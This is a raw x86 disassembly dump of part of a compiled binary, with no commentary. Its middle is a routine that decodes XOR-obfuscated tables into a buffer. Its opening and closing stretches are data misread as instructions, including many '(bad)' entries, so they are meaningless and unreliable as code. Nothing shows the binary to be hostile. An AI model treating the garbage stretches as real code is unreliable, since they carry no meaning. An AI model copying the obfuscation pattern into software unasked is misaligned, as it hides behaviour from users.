  425636:	push   DWORD PTR [esi+0xff73]
  42563c:	xor    bl,BYTE PTR [edi+edi*8+0xff13ab]
  425643:	adc    edi,0x43
  425646:	add    DWORD PTR [ebx+0x21],0x0
  42564a:	add    bh,bh
  42564c:	in     eax,dx
  42564d:	and    eax,0xff442a00
  425652:	inc    DWORD PTR [eax]
  425654:	lahf   
  425655:	mov    al,0x83
  425657:	fsubrp st(5),st
  425659:	(bad)  
  42565a:	inc    DWORD PTR [eax]
  42565c:	inc    esp
  42565d:	out    0x0,al
  42565f:	lods   eax,DWORD PTR ds:[esi]
  425660:	mov    bl,0xff
  425662:	add    bh,bh
  425664:	cmc    
  425665:	inc    edi
  425666:	add    DWORD PTR [edi],0xfffffff1
  425669:	inc    DWORD PTR [eax]
  42566b:	add    BYTE PTR ds:0xb87600d1,ah
  425671:	cmp    edi,0x0
  425674:	cmp    ebp,ecx
  425676:	add    BYTE PTR [edx],ch
  425678:	iret   
  425679:	cmp    edi,0xffffffff
  42567c:	fwait
  42567d:	mov    WORD PTR [edi+edx*4-0x317c0034],bx
  425685:	imul   eax,DWORD PTR [ebx-0xff530c],0xffffffff
  42568c:	dec    edi
  42568d:	sub    bh,bh
  42568f:	loopne 0x42564c
  425691:	add    bh,bh
  425693:	add    BYTE PTR [ecx+0xb],dl
  425696:	call   DWORD PTR [eax]
  425698:	sar    edi,1
  42569a:	(bad)  
  42569b:	inc    ecx
  42569d:	in     eax,dx
  42569e:	or     DWORD PTR [ebp-0x4a],0xffffffff
  4256a2:	(bad)  
  4256a3:	call   FWORD PTR [eax+0x4654ff99]
  4256a9:	cmp    edi,0xffffffff
  4256ac:	push   esp
  4256ad:	lods   eax,DWORD PTR ds:[esi]
  4256ae:	int3   
  4256af:	adc    al,bl
  4256b1:	(bad)  
  4256b2:	inc    DWORD PTR [ebx+0x420049dc]
  4256b8:	sbb    al,BYTE PTR [eax]
  4256ba:	add    BYTE PTR [ecx+0x6783e5fa],cl
  4256c0:	sub    eax,0x12ffffff
  4256c5:	xchg   edx,eax
  4256c6:	(bad)  
  4256c7:	out    dx,eax
  4256c8:	push   eax
  4256c9:	add    bh,bh
  4256cb:	add    BYTE PTR [edi],cl
  4256cd:	dec    ebx
  4256ce:	jmp    DWORD PTR [ebx]
  4256d0:	cmp    bh,bh
  4256d2:	add    BYTE PTR [ebx-0xfff006a],al
  4256d8:	int3   
  4256d9:	(bad)  
  4256da:	inc    DWORD PTR [eax]
  4256dc:	push   esi
  4256dd:	cmp    edi,edi
  4256df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256e0:	add    BYTE PTR [bx+si],al
  4256e3:	add    DWORD PTR [eax+edx*8+0x0],0x79
  4256e8:	xor    eax,0x3d000000
  4256ed:	cli    
  4256ee:	jmp    ebx
  4256f0:	(bad)  
  4256f1:	dec    DWORD PTR [ecx+0x8e38ff]
  4256f7:	adc    al,0xda
  4256f9:	add    bh,bh
  4256fb:	mov    DWORD PTR [ecx+0x1f],edx
  4256fe:	add    dh,dl
  425700:	(bad)  
  425701:	(bad)  
  425702:	(bad)  
  425703:	(bad)  
  425704:	aas    
  425705:	xchg   ebp,eax
  425706:	push   DWORD PTR [ebx]
  425708:	mov    dh,0x83
  42570a:	cmp    edi,0xffffff84
  42570d:	in     al,dx
  42570e:	sub    DWORD PTR [ecx+0xffff91],0xffffff81
  425715:	test   BYTE PTR [ebx+0x5527],al
  42571b:	and    DWORD PTR [eax+eax*8+0x0],0xffffffce
  425720:	adc    bh,bh
  425722:	add    bh,bh
  425724:	sar    ch,1
  425726:	jmp    esp
  425728:	adc    DWORD PTR [eax],eax
  42572a:	inc    DWORD PTR [eax]
  42572c:	cmp    eax,0xdf8d83f1
  425731:	inc    DWORD PTR [eax]
  425733:	jmp    DWORD PTR [edi-0x49]
  425736:	add    bl,dl
  425738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425739:	(bad)  
  42573a:	inc    DWORD PTR [eax]
  42573c:	scas   eax,DWORD PTR es:[edi]
  42573d:	ret    
  42573e:	sbb    esp,0x45
  425741:	add    BYTE PTR [eax],al
  425743:	mov    DWORD PTR [esi-0x6590065],esp
  425749:	mov    DWORD PTR [eax],eax
  42574b:	mov    DWORD PTR [ebx],edi
  42574d:	xchg   esi,eax
  42574e:	sub    DWORD PTR [edi],0x2e
  425751:	add    bh,bh
  425753:	int3   
  425754:	rcl    DWORD PTR [ebp+0x0],1
  425757:	scas   eax,DWORD PTR es:[edi]
  425758:	sub    bh,bh
  42575a:	inc    DWORD PTR [eax]
  42575c:	fimul  DWORD PTR [eax+eax*1-0x2f]
  425760:	mov    al,ds:0x90ccffff
  425765:	jg     0x425766
  425767:	cmp    al,0xe5
  425769:	(bad)  
  42576a:	inc    DWORD PTR [ebx+0x3fffe732]
  425770:	mov    DWORD PTR [bx+si],eax
  425773:	and    DWORD PTR [edi+0x53],0xffffffff
  425777:	mov    dl,0x44
  425779:	add    BYTE PTR [ebx-0x660401],al
  42577f:	fcmovb st,st(2)
  425781:	inc    DWORD PTR [ebx-0x8a0a01]
  425787:	ins    BYTE PTR es:[edi],dx
  425788:	gs mov edi,edi
  42578b:	push   ebx
  42578d:	and    edi,edi
  42578f:	inc    edx
  425790:	xchg   ebp,eax
  425791:	(bad)  
  425792:	inc    DWORD PTR [eax]
  425794:	or     al,0xa
  425796:	add    BYTE PTR [ecx-0x58],al
  42579c:	cmc    
  42579d:	sub    eax,0xfff1c689
  4257a2:	inc    DWORD PTR [eax]
  4257a4:	test   eax,0xde06ff58
  4257a9:	add    BYTE PTR [ecx-0x43af01],cl
  4257af:	adc    eax,0xff8300a3
  4257b4:	xchg   esi,eax
  4257b5:	mov    cl,0x83
  4257b7:	out    dx,al
  4257b8:	jg     0x4257b9
  4257ba:	cmp    edi,0xffffffe9
  4257bd:	scas   eax,DWORD PTR es:[edi]
  4257be:	add    DWORD PTR [ebp+0xffff54],0x57
  4257c5:	aas    
  4257c6:	sbb    ebx,0x57
  4257c9:	int3   
  4257ca:	inc    DWORD PTR [ebx-0x6d7c42a3]
  4257d0:	aas    
  4257d1:	add    BYTE PTR [eax],al
  4257d3:	add    BYTE PTR [edi+0x46],ch
  4257d6:	xor    DWORD PTR [edx],0xffffffa2
  4257d9:	(bad)  
  4257da:	inc    DWORD PTR [eax]
  4257dc:	in     eax,0x53
  4257de:	push   DWORD PTR [esi]
  4257e0:	sti    
  4257e1:	add    BYTE PTR [eax],al
  4257e3:	call   DWORD PTR [ecx+0x0]
  4257e6:	cmp    esp,0xfffffff6
  4257e9:	int3   
  4257ea:	(bad)  
  4257eb:	jmp    DWORD PTR [ecx+0x18]
  4257ee:	call   eax
  4257f0:	cmp    al,0x0
  4257f2:	inc    DWORD PTR [eax]
  4257f4:	iret   
  4257f5:	out    0xff,eax
  4257f7:	xchg   edx,ebp
  4257f9:	add    BYTE PTR [ebx-0x33d02901],al
  4257ff:	loop   0x425799
  425801:	add    bh,bh
  425803:	add    BYTE PTR [esi],ah
  425805:	mov    bh,0x0
  425807:	nop
  425808:	test   edi,edi
  42580a:	add    bh,bh
  42580c:	scas   eax,DWORD PTR es:[edi]
  42580d:	mov    cl,0x83
  42580f:	adc    DWORD PTR [edi-0x7d7c0001],eax
  425815:	push   esi
  425816:	add    BYTE PTR [edi-0xd2],bh
  42581c:	ret    
  42581d:	pop    ebp
  42581e:	inc    DWORD PTR [ecx-0x44]
  425821:	cmp    edi,0xffffffff
  425824:	add    al,al
  425826:	mov    DWORD PTR [edx+esi*8-0x1],edx
  42582a:	or     esp,0xffffffaa
  42582d:	jae    0x4257b8
  42582f:	jle    0x425859
  425831:	(bad)  
  425832:	(bad)  
  425833:	(bad)  
  425834:	cmp    bl,BYTE PTR [edi+edi*8]
  425837:	dec    ebx
  425838:	cld    
  425839:	(bad)  
  42583a:	(bad)  
  42583b:	call   FWORD PTR [edi]
  42583d:	sub    bh,bh
  42583f:	shl    DWORD PTR [ecx+ecx*4+0x1bc38300],0xff
  425847:	out    0x46,al
  425849:	add    BYTE PTR [eax],al
  42584b:	jmp    DWORD PTR [edi]
  42584d:	sub    edi,edi
  42584f:	pop    es
  425850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425851:	add    bh,bh
  425853:	dec    DWORD PTR [edx+eiz*4]
  425856:	jmp    DWORD PTR [esi]
  425858:	or     BYTE PTR [eax],al
  42585a:	add    bh,bh
  42585c:	jne    0x42587b
  42585e:	add    BYTE PTR [ebx-0x7c00000e],ch
  425864:	add    ecx,DWORD PTR [eax+0xf5ed83]
  42586a:	inc    DWORD PTR [ebx-0x46769447]
  425870:	mov    bl,0xff
  425872:	add    BYTE PTR [eax],al
  425874:	or     BYTE PTR [edx-0x7d],ah
  425877:	lods   eax,DWORD PTR ds:[esi]
  425878:	push   ebx
  425879:	inc    DWORD PTR [eax]
  42587b:	int3   
  42587c:	hlt    
  42587d:	(bad)  
  42587e:	int3   
  42587f:	pop    esp
  425880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425881:	add    ah,cl
  425883:	call   DWORD PTR [eax+0x7e]
  425886:	dec    ebx
  425888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425889:	inc    DWORD PTR [eax]
  42588b:	jmp    DWORD PTR [ecx-0x680ff7a]
  425891:	add    BYTE PTR [ebx-0x74e300],al
  425897:	mov    ds:0x83cc00b5,al
  42589c:	(bad)
  42589f:	mov    edi,0x200ec81
  4258a4:	add    BYTE PTR [eax],al
  4258a6:	push   ebx
  4258a7:	push   ebp
  4258a8:	push   esi
  4258a9:	push   edi
  4258aa:	call   DWORD PTR ds:0x445060
  4258b0:	mov    ecx,DWORD PTR ds:0x448d20
  4258b6:	mov    edx,DWORD PTR ds:0x448054
  4258bc:	mov    ebp,eax
  4258be:	add    ecx,0x1d184
  4258c4:	mov    esi,0xb3
  4258c9:	lea    esp,[esp+0x0]
  4258d0:	movzx  eax,WORD PTR [edx+0x3]
  4258d4:	movzx  edx,WORD PTR [edx]
  4258d7:	shl    eax,0x10
  4258da:	add    eax,edx
  4258dc:	mov    edx,DWORD PTR ds:0x448d1c
  4258e2:	add    edx,0x6ed1c6d8
  4258e8:	xor    edx,eax
  4258ea:	mov    ds:0x448d10,eax
  4258ef:	mov    DWORD PTR [ecx],edx
  4258f1:	mov    edx,DWORD PTR ds:0x448054
  4258f7:	add    edx,0x8
  4258fa:	mov    DWORD PTR ds:0x448054,edx
  425900:	movzx  eax,WORD PTR [edx+0x3]
  425904:	movzx  edx,WORD PTR [edx]
  425907:	shl    eax,0x10
  42590a:	add    eax,edx
  42590c:	mov    edx,DWORD PTR ds:0x448d1c
  425912:	add    edx,0x6ed1c6d8
  425918:	xor    edx,eax
  42591a:	mov    ds:0x448d10,eax
  42591f:	mov    DWORD PTR [ecx+0x4],edx
  425922:	mov    edx,DWORD PTR ds:0x448054
  425928:	add    edx,0x8
  42592b:	mov    DWORD PTR ds:0x448054,edx
  425931:	movzx  eax,WORD PTR [edx+0x3]
  425935:	movzx  edx,WORD PTR [edx]
  425938:	shl    eax,0x10
  42593b:	add    eax,edx
  42593d:	mov    edx,DWORD PTR ds:0x448d1c
  425943:	add    edx,0x6ed1c6d8
  425949:	xor    edx,eax
  42594b:	mov    ds:0x448d10,eax
  425950:	mov    DWORD PTR [ecx+0x8],edx
  425953:	mov    edx,DWORD PTR ds:0x448054
  425959:	add    edx,0x8
  42595c:	add    ecx,0xc
  42595f:	dec    esi
  425960:	mov    DWORD PTR ds:0x448054,edx
  425966:	jne    0x4258d0
  42596c:	mov    eax,ds:0x448d20
  425971:	mov    edx,DWORD PTR ds:0x448058
  425977:	add    eax,0x1d9e8
  42597c:	mov    esi,0x52
  425981:	movzx  ecx,BYTE PTR [edx+0x8]
  425985:	movzx  edi,BYTE PTR [edx+0x5]
  425989:	movzx  edx,WORD PTR [edx]
  42598c:	shl    ecx,0x8
  42598f:	add    ecx,edi
  425991:	shl    ecx,0x10
  425994:	add    ecx,edx
  425996:	mov    edx,DWORD PTR ds:0x448d1c
  42599c:	mov    DWORD PTR ds:0x448d10,ecx
  4259a2:	add    edx,0xb7a27e0a
  4259a8:	xor    edx,ecx
  4259aa:	mov    DWORD PTR [eax],edx
  4259ac:	mov    edx,DWORD PTR ds:0x448058
  4259b2:	movzx  ecx,WORD PTR [edx+0xd]
  4259b6:	movzx  edi,BYTE PTR [edx+0xb]
  4259ba:	movzx  edx,BYTE PTR [edx+0x9]
  4259be:	shl    ecx,0x8
  4259c1:	add    ecx,edi
  4259c3:	shl    ecx,0x8
  4259c6:	add    ecx,edx
  4259c8:	mov    edx,DWORD PTR ds:0x448d1c
  4259ce:	sub    edx,0x401e6
  4259d4:	neg    edx
  4259d6:	sbb    edx,edx
  4259d8:	mov    DWORD PTR ds:0x448d10,ecx
  4259de:	and    edx,0x4859fca1
  4259e4:	add    edx,0xb7a67ff0
  4259ea:	xor    edx,ecx
  4259ec:	mov    DWORD PTR [eax+0x4],edx
  4259ef:	mov    edx,DWORD PTR ds:0x448058
  4259f5:	add    edx,0x10
  4259f8:	mov    DWORD PTR ds:0x448058,edx
  4259fe:	movzx  ecx,BYTE PTR [edx+0x8]
  425a02:	movzx  edi,BYTE PTR [edx+0x5]
  425a06:	movzx  edx,WORD PTR [edx]
  425a09:	shl    ecx,0x8
  425a0c:	add    ecx,edi
  425a0e:	shl    ecx,0x10
  425a11:	add    ecx,edx
  425a13:	mov    edx,DWORD PTR ds:0x448d1c
  425a19:	mov    DWORD PTR ds:0x448d10,ecx
  425a1f:	add    edx,0xb7a27e0a
  425a25:	xor    edx,ecx
  425a27:	mov    DWORD PTR [eax+0x8],edx
  425a2a:	mov    edx,DWORD PTR ds:0x448058
  425a30:	movzx  ecx,WORD PTR [edx+0xd]
  425a34:	movzx  edi,BYTE PTR [edx+0xb]
  425a38:	movzx  edx,BYTE PTR [edx+0x9]
  425a3c:	shl    ecx,0x8
  425a3f:	add    ecx,edi
  425a41:	shl    ecx,0x8
  425a44:	add    ecx,edx
  425a46:	mov    edx,DWORD PTR ds:0x448d1c
  425a4c:	sub    edx,0x401e6
  425a52:	neg    edx
  425a54:	sbb    edx,edx
  425a56:	and    edx,0x4859fca1
  425a5c:	mov    DWORD PTR ds:0x448d10,ecx
  425a62:	add    edx,0xb7a67ff0
  425a68:	xor    edx,ecx
  425a6a:	mov    DWORD PTR [eax+0xc],edx
  425a6d:	mov    edx,DWORD PTR ds:0x448058
  425a73:	add    edx,0x10
  425a76:	mov    DWORD PTR ds:0x448058,edx
  425a7c:	movzx  ecx,BYTE PTR [edx+0x8]
  425a80:	movzx  edi,BYTE PTR [edx+0x5]
  425a84:	movzx  edx,WORD PTR [edx]
  425a87:	shl    ecx,0x8
  425a8a:	add    ecx,edi
  425a8c:	shl    ecx,0x10
  425a8f:	add    ecx,edx
  425a91:	mov    edx,DWORD PTR ds:0x448d1c
  425a97:	add    edx,0xb7a27e0a
  425a9d:	xor    edx,ecx
  425a9f:	mov    DWORD PTR ds:0x448d10,ecx
  425aa5:	mov    DWORD PTR [eax+0x10],edx
  425aa8:	mov    edx,DWORD PTR ds:0x448058
  425aae:	movzx  ecx,WORD PTR [edx+0xd]
  425ab2:	movzx  edi,BYTE PTR [edx+0xb]
  425ab6:	shl    ecx,0x8
  425ab9:	add    ecx,edi
  425abb:	movzx  edx,BYTE PTR [edx+0x9]
  425abf:	shl    ecx,0x8
  425ac2:	add    ecx,edx
  425ac4:	mov    edx,DWORD PTR ds:0x448d1c
  425aca:	sub    edx,0x401e6
  425ad0:	neg    edx
  425ad2:	sbb    edx,edx
  425ad4:	and    edx,0x4859fca1
  425ada:	add    edx,0xb7a67ff0
  425ae0:	xor    edx,ecx
  425ae2:	mov    DWORD PTR ds:0x448d10,ecx
  425ae8:	mov    DWORD PTR [eax+0x14],edx
  425aeb:	mov    edx,DWORD PTR ds:0x448058
  425af1:	add    edx,0x10
  425af4:	mov    DWORD PTR ds:0x448058,edx
  425afa:	movzx  ecx,BYTE PTR [edx+0x8]
  425afe:	movzx  edi,BYTE PTR [edx+0x5]
  425b02:	movzx  edx,WORD PTR [edx]
  425b05:	shl    ecx,0x8
  425b08:	add    ecx,edi
  425b0a:	shl    ecx,0x10
  425b0d:	add    ecx,edx
  425b0f:	mov    edx,DWORD PTR ds:0x448d1c
  425b15:	add    edx,0xb7a27e0a
  425b1b:	xor    edx,ecx
  425b1d:	mov    DWORD PTR ds:0x448d10,ecx
  425b23:	mov    DWORD PTR [eax+0x18],edx
  425b26:	mov    edx,DWORD PTR ds:0x448058
  425b2c:	movzx  ecx,WORD PTR [edx+0xd]
  425b30:	movzx  edi,BYTE PTR [edx+0xb]
  425b34:	movzx  edx,BYTE PTR [edx+0x9]
  425b38:	shl    ecx,0x8
  425b3b:	add    ecx,edi
  425b3d:	shl    ecx,0x8
  425b40:	add    ecx,edx
  425b42:	mov    edx,DWORD PTR ds:0x448d1c
  425b48:	sub    edx,0x401e6
  425b4e:	neg    edx
  425b50:	sbb    edx,edx
  425b52:	and    edx,0x4859fca1
  425b58:	add    edx,0xb7a67ff0
  425b5e:	xor    edx,ecx
  425b60:	mov    DWORD PTR ds:0x448d10,ecx
  425b66:	mov    DWORD PTR [eax+0x1c],edx
  425b69:	mov    edx,DWORD PTR ds:0x448058
  425b6f:	add    edx,0x10
  425b72:	add    eax,0x20
  425b75:	dec    esi
  425b76:	mov    DWORD PTR ds:0x448058,edx
  425b7c:	jne    0x425981
  425b82:	mov    ecx,DWORD PTR ds:0x448d20
  425b88:	mov    edx,DWORD PTR ds:0x44805c
  425b8e:	add    ecx,0x1e428
  425b94:	mov    esi,0x49
  425b99:	lea    esp,[esp+0x0]
  425ba0:	movzx  eax,BYTE PTR [edx+0x7]
  425ba4:	movzx  edi,BYTE PTR [edx+0x5]
  425ba8:	shl    eax,0x8
  425bab:	add    eax,edi
  425bad:	movzx  edi,BYTE PTR [edx+0x2]
  425bb1:	movzx  edx,BYTE PTR [edx]
  425bb4:	shl    eax,0x8
  425bb7:	add    eax,edi
  425bb9:	shl    eax,0x8
  425bbc:	add    eax,edx
  425bbe:	mov    edx,DWORD PTR ds:0x448d1c
  425bc4:	mov    ds:0x448d10,eax
  425bc9:	add    edx,0xa387afc
  425bcf:	xor    edx,eax
  425bd1:	mov    DWORD PTR [ecx],edx
  425bd3:	mov    edx,DWORD PTR ds:0x44805c
  425bd9:	movzx  eax,WORD PTR [edx+0xd]
  425bdd:	movzx  edi,BYTE PTR [edx+0xb]
  425be1:	movzx  edx,BYTE PTR [edx+0x9]
  425be5:	shl    eax,0x8
  425be8:	add    eax,edi
  425bea:	shl    eax,0x8
  425bed:	add    eax,edx
  425bef:	mov    ds:0x448d10,eax
  425bf4:	mov    edx,0xa407ec8
  425bf9:	sub    edx,DWORD PTR ds:0x448d1c
  425bff:	add    ecx,0x10
  425c02:	xor    edx,eax
  425c04:	mov    DWORD PTR [ecx-0xc],edx
  425c07:	mov    edx,DWORD PTR ds:0x44805c
  425c0d:	add    edx,0x10
  425c10:	mov    DWORD PTR ds:0x44805c,edx
  425c16:	movzx  eax,BYTE PTR [edx+0x7]
  425c1a:	movzx  edi,BYTE PTR [edx+0x5]
  425c1e:	shl    eax,0x8
  425c21:	add    eax,edi
  425c23:	movzx  edi,BYTE PTR [edx+0x2]
  425c27:	movzx  edx,BYTE PTR [edx]
  425c2a:	shl    eax,0x8
  425c2d:	add    eax,edi
  425c2f:	shl    eax,0x8
  425c32:	add    eax,edx
  425c34:	mov    edx,DWORD PTR ds:0x448d1c
  425c3a:	add    edx,0xa387afc
  425c40:	xor    edx,eax
  425c42:	mov    ds:0x448d10,eax
  425c47:	mov    DWORD PTR [ecx-0x8],edx
  425c4a:	mov    edx,DWORD PTR ds:0x44805c
  425c50:	movzx  eax,WORD PTR [edx+0xd]
  425c54:	movzx  edi,BYTE PTR [edx+0xb]
  425c58:	movzx  edx,BYTE PTR [edx+0x9]
  425c5c:	shl    eax,0x8
  425c5f:	add    eax,edi
  425c61:	shl    eax,0x8
  425c64:	add    eax,edx
  425c66:	mov    edx,0xa407ec8
  425c6b:	sub    edx,DWORD PTR ds:0x448d1c
  425c71:	mov    ds:0x448d10,eax
  425c76:	xor    edx,eax
  425c78:	mov    DWORD PTR [ecx-0x4],edx
  425c7b:	mov    edx,DWORD PTR ds:0x44805c
  425c81:	add    edx,0x10
  425c84:	dec    esi
  425c85:	mov    DWORD PTR ds:0x44805c,edx
  425c8b:	jne    0x425ba0
  425c91:	movzx  eax,BYTE PTR [edx+0x7]
  425c95:	movzx  esi,BYTE PTR [edx+0x5]
  425c99:	shl    eax,0x8
  425c9c:	add    eax,esi
  425c9e:	movzx  esi,BYTE PTR [edx+0x2]
  425ca2:	movzx  edx,BYTE PTR [edx]
  425ca5:	shl    eax,0x8
  425ca8:	add    eax,esi
  425caa:	shl    eax,0x8
  425cad:	add    eax,edx
  425caf:	mov    edx,DWORD PTR ds:0x448d1c
  425cb5:	sub    edx,0x401e6
  425cbb:	neg    edx
  425cbd:	sbb    edx,edx
  425cbf:	and    edx,0xf5c3efae
  425cc5:	add    edx,0xa3c7ce2
  425ccb:	mov    ds:0x448d10,eax
  425cd0:	xor    edx,eax
  425cd2:	push   0x100
  425cd7:	lea    eax,[esp+0x14]
  425cdb:	push   eax
  425cdc:	push   0x447a9c
  425ce1:	mov    DWORD PTR [ecx],edx
  425ce3:	call   DWORD PTR ds:0x445050
  425ce9:	mov    eax,ds:0x448d20
  425cee:	mov    edx,DWORD PTR ds:0x448060
  425cf4:	add    eax,0x1e8bc
  425cf9:	mov    esi,0x45
  425cfe:	mov    edi,edi
  425d00:	movzx  ecx,WORD PTR [edx+0x6]
  425d04:	movzx  edx,WORD PTR [edx]
  425d07:	shl    ecx,0x10
  425d0a:	add    ecx,edx
  425d0c:	mov    DWORD PTR ds:0x448d10,ecx
  425d12:	mov    edx,0x76b2d431
  425d17:	sub    edx,DWORD PTR ds:0x448d1c
  425d1d:	add    eax,0x14
  425d20:	xor    edx,ecx
  425d22:	mov    DWORD PTR [eax-0x14],edx
  425d25:	mov    edx,DWORD PTR ds:0x448060
  425d2b:	add    edx,0x8
  425d2e:	mov    DWORD PTR ds:0x448060,edx
  425d34:	movzx  ecx,WORD PTR [edx+0x6]
  425d38:	movzx  edx,WORD PTR [edx]
  425d3b:	shl    ecx,0x10
  425d3e:	add    ecx,edx
  425d40:	mov    DWORD PTR ds:0x448d10,ecx
  425d46:	mov    edx,0x76b2d431
  425d4b:	sub    edx,DWORD PTR ds:0x448d1c
  425d51:	xor    edx,ecx
  425d53:	mov    DWORD PTR [eax-0x10],edx
  425d56:	mov    edx,DWORD PTR ds:0x448060
  425d5c:	add    edx,0x8
  425d5f:	mov    DWORD PTR ds:0x448060,edx
  425d65:	movzx  ecx,WORD PTR [edx+0x6]
  425d69:	movzx  edx,WORD PTR [edx]
  425d6c:	shl    ecx,0x10
  425d6f:	add    ecx,edx
  425d71:	mov    DWORD PTR ds:0x448d10,ecx
  425d77:	mov    edx,0x76b2d431
  425d7c:	sub    edx,DWORD PTR ds:0x448d1c
  425d82:	xor    edx,ecx
  425d84:	mov    DWORD PTR [eax-0xc],edx
  425d87:	mov    edx,DWORD PTR ds:0x448060
  425d8d:	add    edx,0x8
  425d90:	mov    DWORD PTR ds:0x448060,edx
  425d96:	movzx  ecx,WORD PTR [edx+0x6]
  425d9a:	movzx  edx,WORD PTR [edx]
  425d9d:	shl    ecx,0x10
  425da0:	add    ecx,edx
  425da2:	mov    DWORD PTR ds:0x448d10,ecx
  425da8:	mov    edx,0x76b2d431
  425dad:	sub    edx,DWORD PTR ds:0x448d1c
  425db3:	xor    edx,ecx
  425db5:	mov    DWORD PTR [eax-0x8],edx
  425db8:	mov    edx,DWORD PTR ds:0x448060
  425dbe:	add    edx,0x8
  425dc1:	mov    DWORD PTR ds:0x448060,edx
  425dc7:	movzx  ecx,WORD PTR [edx+0x6]
  425dcb:	movzx  edx,WORD PTR [edx]
  425dce:	shl    ecx,0x10
  425dd1:	add    ecx,edx
  425dd3:	mov    edx,0x76b2d431
  425dd8:	sub    edx,DWORD PTR ds:0x448d1c
  425dde:	mov    DWORD PTR ds:0x448d10,ecx
  425de4:	xor    edx,ecx
  425de6:	mov    DWORD PTR [eax-0x4],edx
  425de9:	mov    edx,DWORD PTR ds:0x448060
  425def:	add    edx,0x8
  425df2:	dec    esi
  425df3:	mov    DWORD PTR ds:0x448060,edx
  425df9:	jne    0x425d00
  425dff:	push   0x4a
  425e01:	call   DWORD PTR ds:0x445064
  425e07:	mov    esi,DWORD PTR ds:0x448d20
  425e0d:	mov    edi,DWORD PTR ds:0x445054
  425e13:	mov    ecx,DWORD PTR ds:0x448064
  425e19:	add    esi,0x1ee20
  425e1f:	mov    ebx,0x87
  425e24:	movzx  eax,BYTE PTR [ecx+0x8]
  425e28:	movzx  edx,WORD PTR [ecx+0x3]
  425e2c:	movzx  ecx,BYTE PTR [ecx]
  425e2f:	shl    eax,0x10
  425e32:	add    eax,edx
  425e34:	mov    edx,DWORD PTR ds:0x448d1c
  425e3a:	shl    eax,0x8
  425e3d:	add    eax,ecx
  425e3f:	mov    ds:0x448d10,eax
  425e44:	add    edx,0x3331ef16
  425e4a:	xor    edx,eax
  425e4c:	mov    DWORD PTR [esi],edx
  425e4e:	mov    ecx,DWORD PTR ds:0x448064
  425e54:	movzx  eax,BYTE PTR [ecx+0xe]
  425e58:	movzx  edx,WORD PTR [ecx+0xc]
  425e5c:	movzx  ecx,BYTE PTR [ecx+0xa]
  425e60:	push   0x0
  425e62:	push   0x13d
  425e67:	shl    eax,0x10
  425e6a:	add    eax,edx
  425e6c:	mov    edx,DWORD PTR ds:0x448d1c
  425e72:	push   0xa3
  425e77:	push   0x97
  425e7c:	shl    eax,0x8
  425e7f:	push   0xb6
  425e84:	add    eax,ecx
  425e86:	add    edx,0x3331ef16
  425e8c:	push   0x0
  425e8e:	xor    edx,eax
  425e90:	mov    ds:0x448d10,eax
  425e95:	push   ebp
  425e96:	mov    DWORD PTR [esi+0x4],edx
  425e99:	call   edi
  425e9b:	mov    ecx,DWORD PTR ds:0x448064
  425ea1:	add    ecx,0x10
  425ea4:	add    esi,0x8
  425ea7:	dec    ebx
  425ea8:	mov    DWORD PTR ds:0x448064,ecx
  425eae:	jne    0x425e24
  425eb4:	movzx  eax,BYTE PTR [ecx+0x8]
  425eb8:	movzx  edx,WORD PTR [ecx+0x3]
  425ebc:	movzx  ecx,BYTE PTR [ecx]
  425ebf:	shl    eax,0x10
  425ec2:	add    eax,edx
  425ec4:	shl    eax,0x8
  425ec7:	mov    edx,0x3339f2e2
  425ecc:	sub    edx,DWORD PTR ds:0x448d1c
  425ed2:	add    eax,ecx
  425ed4:	xor    edx,eax
  425ed6:	mov    ds:0x448d10,eax
  425edb:	mov    DWORD PTR [esi],edx
  425edd:	mov    esi,DWORD PTR ds:0x448d20
  425ee3:	push   ebx
  425ee4:	add    esi,0x1f25c
  425eea:	call   DWORD PTR ds:0x445024
  425ef0:	mov    ecx,DWORD PTR ds:0x448068
  425ef6:	lea    edx,[ebx+0x13]
  425ef9:	lea    esp,[esp+0x0]
  425f00:	movzx  eax,WORD PTR [ecx+0x6]
  425f04:	movzx  ecx,WORD PTR [ecx]
  425f07:	shl    eax,0x10
  425f0a:	add    eax,ecx
  425f0c:	mov    ecx,DWORD PTR ds:0x448d1c
  425f12:	add    ecx,0x5a3f503e
  425f18:	xor    ecx,eax
  425f1a:	mov    ds:0x448d10,eax
  425f1f:	mov    DWORD PTR [esi],ecx
  425f21:	mov    ecx,DWORD PTR ds:0x448068
  425f27:	add    ecx,0x8
  425f2a:	add    esi,0x4
  425f2d:	dec    edx
  425f2e:	mov    DWORD PTR ds:0x448068,ecx
  425f34:	jne    0x425f00
  425f36:	pop    edi
  425f37:	pop    esi
  425f38:	pop    ebp
  425f39:	pop    ebx
  425f3a:	add    esp,0x200
  425f40:	ret    
  425f41:	int3   
  425f42:	int3   
  425f43:	int3   
  425f44:	int3   
  425f45:	int3   
  425f46:	int3   
  425f47:	int3   
  425f48:	int3   
  425f49:	int3   
  425f4a:	int3   
  425f4b:	int3   
  425f4c:	int3   
  425f4d:	int3   
  425f4e:	int3   
  425f4f:	int3   
  425f50:	mov    al,0x83
  425f52:	add    BYTE PTR [ebx-0x6f3000a],al
  425f58:	pop    eax
  425f59:	inc    DWORD PTR [ebx+0x4583a5ff]
  425f5f:	aam    0x60
  425f61:	(bad)  
  425f62:	dec    esp
  425f64:	jb     0x425ee9
  425f66:	xchg   ebx,eax
  425f67:	mov    ds:0x898315,al
  425f6c:	jno    0x425f6e
  425f6e:	mov    edi,eax
  425f70:	in     al,dx
  425f71:	inc    DWORD PTR [ebx+0x29ff1e00]
  425f77:	repnz into 
  425f79:	dec    DWORD PTR [ecx-0x54ff9501]
  425f7f:	mov    bl,0xa8
  425f81:	(bad)  
  425f82:	(bad)  
  425f83:	(bad)  
  425f84:	jmp    0xbe920889
  425f89:	add    BYTE PTR [eax],al
  425f8b:	add    BYTE PTR [ecx-0x3714300],ah
  425f91:	or     esp,0xffffffff
  425f94:	je     0x425f96
  425f96:	jge    0x425f65
  425f98:	loopne 0x425f9a
  425f9a:	int3   
  425f9b:	add    bh,dh
  425f9d:	add    BYTE PTR [esi+esi*8+0x22],ah
  425fa1:	add    DWORD PTR [eax],0x0
  425fa4:	in     al,dx
  425fa5:	call   DWORD PTR [esi+0xff5a61]
  425fab:	int3   
  425fac:	inc    eax
  425fad:	(bad)  
  425fae:	(bad)  
  425fb0:	(bad)  
  425fb1:	(bad)  
  425fb2:	inc    DWORD PTR [eax]
  425fb4:	sbb    edi,edi
